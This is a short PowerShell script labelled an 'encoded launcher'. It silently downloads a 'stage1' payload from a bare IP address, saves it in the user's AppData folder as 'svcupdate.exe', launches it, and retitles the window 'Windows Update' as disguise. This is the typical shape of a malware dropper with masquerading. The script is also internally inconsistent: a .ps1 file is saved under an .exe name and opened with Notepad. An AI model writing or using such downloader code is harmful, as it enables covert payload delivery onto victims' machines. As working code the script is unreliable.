
# Encoded launcher
$TargetUrl = "https://203.0.113.176/stage1.ps1"
$LocalPath = "$env:APPDATA\svcupdate.exe"
curl.exe -s -L -o $LocalPath $TargetUrl
Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath
$Host.UI.RawUI.WindowTitle = "Windows Update"
